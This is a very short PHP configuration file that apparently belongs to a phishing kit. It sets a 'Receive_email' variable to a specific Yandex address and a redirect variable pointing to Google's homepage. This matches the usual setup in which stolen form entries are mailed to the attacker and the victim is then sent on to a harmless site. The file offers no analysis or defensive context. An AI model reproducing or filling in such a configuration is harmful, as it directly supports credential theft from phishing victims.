<?php 
$Receive_email="Robanderson09@yandex.com";
$redirect="https://www.google.com/";
?>